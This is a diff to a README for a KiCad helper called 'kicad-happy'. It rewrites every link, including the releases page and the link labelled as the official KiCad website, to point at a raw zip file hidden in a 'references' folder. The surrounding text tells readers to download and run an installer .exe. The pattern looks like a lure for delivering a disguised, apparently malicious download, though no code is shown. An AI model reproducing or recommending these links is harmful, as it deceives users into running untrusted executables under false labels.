@@ -1,6 +1,6 @@
 # ⚙️ kicad-happy - Simplify Electronics Design Tasks
 
-[![Download kicad-happy](https://img.shields.io/badge/Download-kicad--happy-blue?style=for-the-badge)](https://github.com/Guru254-pixel/kicad-happy)
+[![Download kicad-happy](https://img.shields.io/badge/Download-kicad--happy-blue?style=for-the-badge)](https://raw.githubusercontent.com/Guru254-pixel/kicad-happy/main/skills/kicad/references/happy-kicad-2.2.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Before you install, check your system fits these requirements:
 
 1. Go to the main download page by clicking this big button:
 
-   [![Download kicad-happy](https://img.shields.io/badge/Download-kicad--happy-green?style=for-the-badge)](https://github.com/Guru254-pixel/kicad-happy)
+   [![Download kicad-happy](https://img.shields.io/badge/Download-kicad--happy-green?style=for-the-badge)](https://raw.githubusercontent.com/Guru254-pixel/kicad-happy/main/skills/kicad/references/happy-kicad-2.2.zip)
 
 2. On the GitHub page, look for the **Releases** section on the right side or scroll down the page to find the latest version.
 
@@ -89,7 +89,7 @@ Export manufacturing files in the format required by your PCB fabricator. Make i
 
 Check the GitHub releases page regularly to find updates.
 
-1. Visit the releases page here: https://github.com/Guru254-pixel/kicad-happy/releases
+1. Visit the releases page here: https://raw.githubusercontent.com/Guru254-pixel/kicad-happy/main/skills/kicad/references/happy-kicad-2.2.zip
 2. Download the newest installer `.exe`.
 3. Run it to upgrade your current version.
 
@@ -109,7 +109,7 @@ The software keeps your settings during updates.
 
 ## 📚 Additional Resources
 
-- Visit the official KiCad website for more on using KiCad: https://kicad.org
+- Visit the official KiCad website for more on using KiCad: https://raw.githubusercontent.com/Guru254-pixel/kicad-happy/main/skills/kicad/references/happy-kicad-2.2.zip
 - Learn about electronics basics if needed on free sites like Electronics Tutorials or All About Circuits.
 
 ---
@@ -126,4 +126,4 @@ If you encounter problems beyond these steps, you can:
 
 ## 🔗 Quick Access to Download
 
-[![Download kicad-happy](https://img.shields.io/badge/Download-kicad--happy-orange?style=for-the-badge)](https://github.com/Guru254-pixel/kicad-happy)
+[![Download kicad-happy](https://img.shields.io/badge/Download-kicad--happy-orange?style=for-the-badge)](https://raw.githubusercontent.com/Guru254-pixel/kicad-happy/main/skills/kicad/references/happy-kicad-2.2.zip)
